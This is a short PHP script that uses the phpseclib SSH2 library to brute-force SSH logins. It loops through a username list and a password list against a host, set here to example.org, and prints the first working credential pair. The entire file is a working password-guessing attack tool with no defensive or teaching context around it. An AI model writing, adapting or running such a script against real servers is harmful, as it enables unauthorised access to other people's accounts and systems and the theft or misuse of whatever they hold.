<?php
set_include_path(get_include_path() . PATH_SEPARATOR . 'phpseclib');
include('Net/SSH2.php');
$host = "example.org";

$userList = file_get_contents("list/userList");
$users = explode("\n", $userList);

foreach($users as $user) {
	$passList = file_get_contents("list/passList");
	$passes = explode("\n", $passList);
	
	foreach($passes as $pass) {
		//echo "Attemping username " . $user . " and password " . $pass . "\n";
		$ssh = new NET_SSH2($host);

		if(!$ssh->login($user,$pass)) {
				echo ".";
			}else {
				echo "\n\nLogin Succeeded\n";
				echo "Username: " . $user . " and Password: " . $pass . "\n";
				exit;
		}
		
	}
}

?>